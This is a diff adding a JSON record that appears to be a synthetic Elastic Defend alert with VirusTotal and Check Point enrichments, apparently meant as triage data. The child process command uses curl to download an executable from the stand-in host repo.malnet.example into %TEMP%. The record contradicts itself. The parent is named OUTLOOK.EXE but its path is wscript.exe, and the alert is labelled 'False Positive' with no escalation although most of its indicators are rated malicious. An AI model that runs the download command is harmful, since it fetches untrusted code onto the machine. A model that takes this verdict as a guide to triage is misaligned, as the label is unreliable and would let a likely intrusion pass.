@@ -1,0 +1,519 @@
+{
+  "schema_version": "edr_alert+enrichments/1.0",
+  "alert": {
+    "alert_id": "e67a30f3-33cd-45ca-9e6d-ec88fd500f23",
+    "timestamp": "2025-08-10T15:14:53.231963+05:30",
+    "vendor": "Elastic",
+    "product": "Elastic Defend",
+    "category": "False Positive",
+    "agent_verdict": {
+      "label": "False Positive",
+      "true_positive": false,
+      "false_positive": true,
+      "escalate": false
+    },
+    "event_type": "process_creation",
+    "severity": "Low",
+    "action": "Allowed",
+    "rule_name": "Suspicious Command Line (Tunable)",
+    "rule_pack": "Sigma Bundle v5.2",
+    "mitre_attack": [
+      "T1027 (Obfuscated/Compressed Files and Information)",
+      "T1041 (Exfiltration Over C2 Channel)",
+      "T1218 (Signed Binary Proxy Execution)"
+    ],
+    "device": {
+      "hostname": "JUMP-9833",
+      "os": "Windows 11 Pro 23H2",
+      "os_version": "10.0.22631",
+      "user": "localadmin@acme-corp.com",
+      "department": "IT",
+      "sensor_version": "6.4.3"
+    },
+    "process": {
+      "parent": {
+        "name": "OUTLOOK.EXE",
+        "path": "C:\\Windows\\System32\\wscript.exe",
+        "pid": 4491,
+        "integrity": "High",
+        "signer": "Microsoft Office"
+      },
+      "child": {
+        "name": "cmd.exe",
+        "path": "C:\\Windows\\System32\\\\cmd.exe",
+        "pid": 13060,
+        "ppid": 4491,
+        "cmdline": "cmd.exe /c curl http://repo.malnet.example/a -o %TEMP%\\a.exe",
+        "integrity": "Medium",
+        "signer": "Microsoft Windows"
+      },
+      "image_hash": {
+        "md5": "58407806c824d0d2fae367aa86a224ef",
+        "sha1": "4043ba9cda66f8b3f662c3c78da2075c02a770e4",
+        "sha256": "bb219eb8ac13fce0e348dee2a28e1330d006302237d1f06ad15f75d371b3efa0"
+      },
+      "tty": "RDP"
+    },
+    "decoded_payload": null,
+    "key_ops_observed": [
+      null,
+      null,
+      null
+    ],
+    "network": {
+      "dst_ip": "78.146.159.253",
+      "dst_port": 80,
+      "protocol": "TCP",
+      "ja3": "72a589da586844d7f0818ce684948eea",
+      "bytes_out": 16084,
+      "bytes_in": 2137,
+      "beacon_interval_s": 30
+    },
+    "amsi_or_script": null,
+    "persistence": false,
+    "lsass_access": false,
+    "ransomware_ioa": false,
+    "quarantine_path": null,
+    "tags": [
+      "beacon",
+      "behavior",
+      "edr",
+      "process_creation"
+    ]
+  },
+  "enrichments": {
+    "generated_at": "2025-08-10T17:44:45.231963+00:00",
+    "iocs": [
+      {
+        "ioc_id": "url:1",
+        "type": "url",
+        "value": "http://repo.malnet.example/a",
+        "context": {
+          "found_in": "process.child.cmdline",
+          "alert_id": "e67a30f3-33cd-45ca-9e6d-ec88fd500f23",
+          "device": "JUMP-9833"
+        },
+        "virustotal": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "permalink": null,
+          "detection_statistics": {
+            "malicious": 23,
+            "total_engines": 70,
+            "formatted": "23 / 70"
+          },
+          "reputation": {
+            "community_score": -100,
+            "votes_malicious": 0,
+            "votes_harmless": 0
+          },
+          "classification": {
+            "verdict": "malicious",
+            "confidence_percent": 80,
+            "severity_percent": 97
+          },
+          "vendors": [
+            {
+              "vendor": "Fortinet",
+              "category": "malicious",
+              "result": "Phishing"
+            },
+            {
+              "vendor": "Symantec",
+              "category": "malicious",
+              "result": "C2"
+            },
+            {
+              "vendor": "CrowdStrike",
+              "category": "malicious",
+              "result": "Trojan.Generic"
+            },
+            {
+              "vendor": "Microsoft",
+              "category": "malicious",
+              "result": "C2"
+            }
+          ]
+        },
+        "checkpoint": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "reference": null,
+          "verdict": "malicious",
+          "risk": 87,
+          "confidence_percent": 92,
+          "categories": [
+            "Malware",
+            "Phishing"
+          ],
+          "malware_family": null,
+          "first_seen": "2025-07-27T09:44:53.231963+00:00",
+          "last_seen": "2025-08-10T09:44:53.231963+00:00",
+          "evidence": [
+            "Ingress tool transfer (curl/Invoke-WebRequest/BITS)"
+          ],
+          "geo": null
+        }
+      },
+      {
+        "ioc_id": "domain:2",
+        "type": "domain",
+        "value": "repo.malnet.example",
+        "context": {
+          "found_in": "derived(domain_from:process.child.cmdline)",
+          "alert_id": "e67a30f3-33cd-45ca-9e6d-ec88fd500f23",
+          "device": "JUMP-9833"
+        },
+        "virustotal": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "permalink": null,
+          "detection_statistics": {
+            "malicious": 2,
+            "total_engines": 70,
+            "formatted": "2 / 70"
+          },
+          "reputation": {
+            "community_score": -26,
+            "votes_malicious": 0,
+            "votes_harmless": 0
+          },
+          "classification": {
+            "verdict": "suspicious",
+            "confidence_percent": 62,
+            "severity_percent": 58
+          },
+          "vendors": [
+            {
+              "vendor": "Sophos",
+              "category": "suspicious",
+              "result": "Heuristic"
+            }
+          ]
+        },
+        "checkpoint": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "reference": null,
+          "verdict": "suspicious",
+          "risk": 58,
+          "confidence_percent": 71,
+          "categories": null,
+          "malware_family": null,
+          "first_seen": "2025-07-20T09:44:53.231963+00:00",
+          "last_seen": "2025-08-10T09:44:53.231963+00:00",
+          "evidence": null,
+          "geo": null
+        }
+      },
+      {
+        "ioc_id": "ip:3",
+        "type": "ip",
+        "value": "78.146.159.253",
+        "context": {
+          "found_in": "network.dst_ip",
+          "alert_id": "e67a30f3-33cd-45ca-9e6d-ec88fd500f23",
+          "device": "JUMP-9833"
+        },
+        "virustotal": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "permalink": null,
+          "detection_statistics": {
+            "malicious": 0,
+            "total_engines": 70,
+            "formatted": "0 / 70"
+          },
+          "reputation": {
+            "community_score": 67,
+            "votes_malicious": 0,
+            "votes_harmless": 0
+          },
+          "classification": {
+            "verdict": "benign",
+            "confidence_percent": 91,
+            "severity_percent": 5
+          },
+          "vendors": [
+            {
+              "vendor": "Microsoft",
+              "category": "undetected",
+              "result": null
+            },
+            {
+              "vendor": "Symantec",
+              "category": "undetected",
+              "result": null
+            },
+            {
+              "vendor": "TrendMicro",
+              "category": "undetected",
+              "result": null
+            },
+            {
+              "vendor": "ESET",
+              "category": "undetected",
+              "result": null
+            },
+            {
+              "vendor": "CrowdStrike",
+              "category": "undetected",
+              "result": null
+            }
+          ]
+        },
+        "checkpoint": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "reference": null,
+          "verdict": "benign",
+          "risk": 5,
+          "confidence_percent": 83,
+          "categories": null,
+          "malware_family": null,
+          "first_seen": "2025-06-12T09:44:53.231963+00:00",
+          "last_seen": "2025-08-10T09:44:53.231963+00:00",
+          "evidence": null,
+          "geo": {
+            "country": "CA",
+            "asn": "AS8234",
+            "org": "Akamai"
+          }
+        }
+      },
+      {
+        "ioc_id": "file_hash:4",
+        "type": "file_hash",
+        "value": "bb219eb8ac13fce0e348dee2a28e1330d006302237d1f06ad15f75d371b3efa0",
+        "context": {
+          "found_in": "process.image_hash.sha256",
+          "alert_id": "e67a30f3-33cd-45ca-9e6d-ec88fd500f23",
+          "device": "JUMP-9833"
+        },
+        "virustotal": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "permalink": null,
+          "detection_statistics": {
+            "malicious": 37,
+            "total_engines": 70,
+            "formatted": "37 / 70"
+          },
+          "reputation": {
+            "community_score": -74,
+            "votes_malicious": 0,
+            "votes_harmless": 0
+          },
+          "classification": {
+            "verdict": "malicious",
+            "confidence_percent": 80,
+            "severity_percent": 89
+          },
+          "vendors": [
+            {
+              "vendor": "Microsoft",
+              "category": "malicious",
+              "result": "Downloader"
+            },
+            {
+              "vendor": "CrowdStrike",
+              "category": "malicious",
+              "result": "Trojan.Generic"
+            },
+            {
+              "vendor": "Fortinet",
+              "category": "malicious",
+              "result": "Agent"
+            },
+            {
+              "vendor": "Symantec",
+              "category": "malicious",
+              "result": "Downloader"
+            },
+            {
+              "vendor": "Kaspersky",
+              "category": "malicious",
+              "result": "Phishing"
+            }
+          ]
+        },
+        "checkpoint": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "reference": null,
+          "verdict": "malicious",
+          "risk": 98,
+          "confidence_percent": 77,
+          "categories": [
+            "Downloaded Executable"
+          ],
+          "malware_family": null,
+          "first_seen": "2025-07-29T09:44:53.231963+00:00",
+          "last_seen": "2025-08-10T09:44:53.231963+00:00",
+          "evidence": [
+            "Ingress tool transfer"
+          ],
+          "geo": null
+        }
+      },
+      {
+        "ioc_id": "file_hash:5",
+        "type": "file_hash",
+        "value": "4043ba9cda66f8b3f662c3c78da2075c02a770e4",
+        "context": {
+          "found_in": "process.image_hash.sha1",
+          "alert_id": "e67a30f3-33cd-45ca-9e6d-ec88fd500f23",
+          "device": "JUMP-9833"
+        },
+        "virustotal": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "permalink": null,
+          "detection_statistics": {
+            "malicious": 28,
+            "total_engines": 70,
+            "formatted": "28 / 70"
+          },
+          "reputation": {
+            "community_score": -72,
+            "votes_malicious": 0,
+            "votes_harmless": 0
+          },
+          "classification": {
+            "verdict": "malicious",
+            "confidence_percent": 85,
+            "severity_percent": 93
+          },
+          "vendors": [
+            {
+              "vendor": "ESET",
+              "category": "malicious",
+              "result": "Downloader"
+            },
+            {
+              "vendor": "Symantec",
+              "category": "malicious",
+              "result": "C2"
+            },
+            {
+              "vendor": "BitDefender",
+              "category": "malicious",
+              "result": "Phishing"
+            }
+          ]
+        },
+        "checkpoint": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "reference": null,
+          "verdict": "malicious",
+          "risk": 86,
+          "confidence_percent": 88,
+          "categories": [
+            "Downloaded Executable"
+          ],
+          "malware_family": null,
+          "first_seen": "2025-07-31T09:44:53.231963+00:00",
+          "last_seen": "2025-08-10T09:44:53.231963+00:00",
+          "evidence": [
+            "Ingress tool transfer"
+          ],
+          "geo": null
+        }
+      },
+      {
+        "ioc_id": "file_hash:6",
+        "type": "file_hash",
+        "value": "58407806c824d0d2fae367aa86a224ef",
+        "context": {
+          "found_in": "process.image_hash.md5",
+          "alert_id": "e67a30f3-33cd-45ca-9e6d-ec88fd500f23",
+          "device": "JUMP-9833"
+        },
+        "virustotal": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "permalink": null,
+          "detection_statistics": {
+            "malicious": 40,
+            "total_engines": 70,
+            "formatted": "40 / 70"
+          },
+          "reputation": {
+            "community_score": -67,
+            "votes_malicious": 0,
+            "votes_harmless": 0
+          },
+          "classification": {
+            "verdict": "malicious",
+            "confidence_percent": 83,
+            "severity_percent": 89
+          },
+          "vendors": [
+            {
+              "vendor": "ESET",
+              "category": "malicious",
+              "result": "Trojan.Generic"
+            },
+            {
+              "vendor": "CrowdStrike",
+              "category": "malicious",
+              "result": "Agent"
+            },
+            {
+              "vendor": "Microsoft",
+              "category": "malicious",
+              "result": "Phishing"
+            },
+            {
+              "vendor": "Fortinet",
+              "category": "malicious",
+              "result": "Agent"
+            }
+          ]
+        },
+        "checkpoint": {
+          "status": "complete",
+          "last_checked": "2025-08-10T17:44:45.231963+00:00",
+          "reference": null,
+          "verdict": "malicious",
+          "risk": 98,
+          "confidence_percent": 86,
+          "categories": [
+            "Downloaded Executable"
+          ],
+          "malware_family": null,
+          "first_seen": "2025-08-05T09:44:53.231963+00:00",
+          "last_seen": "2025-08-10T09:44:53.231963+00:00",
+          "evidence": [
+            "Ingress tool transfer"
+          ],
+          "geo": null
+        }
+      }
+    ],
+    "rollup": {
+      "counts": {
+        "total_iocs": 6,
+        "types": {
+          "url": 1,
+          "domain": 1,
+          "ip": 1,
+          "file_hash": 3
+        }
+      },
+      "virustotal": {
+        "malicious_iocs": 4,
+        "suspicious_iocs": 1,
+        "benign_iocs": 1,
+        "unknown_iocs": 0
+      },
+      "checkpoint": {
+        "malicious_iocs": 4,
+        "suspicious_iocs": 1,
+        "benign_iocs": 1,
+        "unknown_iocs": 0
+      }
+    }
+  }
+}
